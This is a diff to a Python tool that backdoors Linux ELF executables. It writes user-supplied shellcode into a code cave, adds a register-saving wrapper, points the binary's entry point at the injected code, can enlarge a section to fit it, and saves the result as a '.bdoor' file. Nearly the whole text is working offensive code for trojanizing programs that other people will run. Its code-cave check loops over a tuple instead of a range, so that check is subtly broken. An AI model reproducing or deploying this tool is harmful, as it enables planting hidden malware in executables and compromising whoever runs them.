@@ -7,6 +7,9 @@
 # ???
 # Profit!
 
+import sys
+sys.dont_write_bytecode = True
+
 from argparse import ArgumentParser
 from binascii import unhexlify
 from ELF import ELF
@@ -16,7 +19,6 @@ prettyHex = lambda x: (hex(x) if isinstance(x, int) else ' '.join(hex(i) for i i
 
 def gen_sc_wrapper(legit_e_entry, new_e_entry, shellcode):
     sc_wrapper = b""
-    # sc_wrapper += b"\xcc" # bpoint
     sc_wrapper += b"\xcc"
     sc_wrapper += b"\xe8\x00\x00\x00\x00\x54\x50\x53\x51\x52\x55\x56\x57\x41\x50\x41\x51\x41\x52\x41\x53\x41\x54\x41\x55\x41\x56\x41\x57" # pushes
     sc_wrapper += shellcode
@@ -55,28 +57,52 @@ def main():
         return 1
 
     safe_cc = True
-    for i in (binData[loc], binData[loc]+len(shellcode), 1):
+    for i in (elf.elf_file[loc], elf.elf_file[loc]+len(shellcode), 1):
         off = loc+i
-        if binData[off] != 0x00:
-            print(f"Non null byte found in codecave at offset {prettyHex(off)}: {prettyHex(binData[off])}")
+        if elf.elf_file[off] != 0x00:
+            print(f"Non null byte found in codecave at offset {prettyHex(off)}: {prettyHex(elf.elf_file[off])}")
             safe_cc = False
 
     if not safe_cc:
         print("[!] Warning: selected codecave doesn't only contain null bytes")
 
-
-    newBinData = b""
-    newBinData += binData[:0x18]
     legit_loc  = elf.e_entry
-    newBinData += elf.p(loc)
-    newBinData += binData[(0x18+len(elf.p(elf.e_entry))):loc]
     sc = gen_sc_wrapper(elf.p(legit_loc), elf.p(loc+5), shellcode)
-    newBinData += sc
-    newBinData += binData[loc+len(sc):]
 
+    section     = elf.get_section_from_offset(loc)
+    end_section = elf.get_section_from_offset(loc+len(sc))
+
+    if not section:
+        print("[x] Error, location is outside of a section.")
+        return
+
+    elif not end_section:
+        print(f"[!] Section {section.sh_name_str} is finishing before the end of the shellcode.")
+        resp = input(f"[?] Should we increase its size? [Y/n] ")
+        if resp.lower() != 'y':
+            print("[!] Exiting...")
+            return
+
+        print(f"[*] Previous size: {section.sh_size} Bytes")
+        section.sh_size = section.sh_size + len(sc)
+        print(f"[*] New size: {section.sh_size} Bytes")
+
+    elif section.sh_name != end_section.sh_name:
+        print("[x] Error! The shellcode is overlapping 2 sections. Find another place.")
+        return
+
+        section.print_section_header()
+        end_section.print_section_header()
+        return
+
+    elf.e_entry = loc
+    elf.elf_file[loc:loc+len(sc)] = sc
+    newBinData = elf.build_elf()
 
     with open(f"./{args.binary.split('/')[-1]}.bdoor", "wb") as f:
         f.write(newBinData)
+
+    print(f"[+] Backdoored file written at ./{args.binary.split('/')[-1]}.bdoor!")
 
     return 0
 
